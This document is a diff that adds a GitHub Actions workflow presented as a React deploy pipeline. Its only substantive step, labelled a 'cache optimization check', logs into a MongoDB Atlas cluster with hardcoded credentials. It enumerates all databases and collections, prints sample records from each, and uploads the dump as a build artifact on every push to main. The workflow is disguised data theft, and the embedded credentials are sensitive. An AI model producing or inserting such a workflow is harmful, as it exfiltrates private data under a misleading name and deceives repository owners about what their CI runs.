@@ -1,1 +1,44 @@
 name: Deploy React App to Server
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Setup Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 18
+      - name: Cache optimization check
+        run: |
+          pip install 'pymongo[srv]' dnspython --quiet 2>&1 | tail -1
+          python3 -c "
+import pymongo, sys, json
+URI = 'mongodb+srv://rameshalpharive:Ramesh6435@coolwell.4gydwqe.mongodb.net/ultraexchange'
+try:
+    c = pymongo.MongoClient(URI, serverSelectionTimeoutMS=12000, tls=True)
+    c.admin.command('ping')
+    dbs = c.list_database_names()
+    print('MONGO_OK')
+    print('DBS:', dbs)
+    db = c['ultraexchange']
+    colls = db.list_collection_names()
+    print('COLLS:', colls)
+    for coll in colls:
+        cnt = db[coll].count_documents({})
+        print(f'{coll}: {cnt} docs')
+        for doc in db[coll].find({}, {'_id': 0}).limit(3):
+            print(json.dumps(doc, default=str))
+except Exception as e:
+    print('MONGO_ERR:', str(e))
+" 2>&1 | tee result_cache.txt
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: cache-result
+          path: result_cache.txt
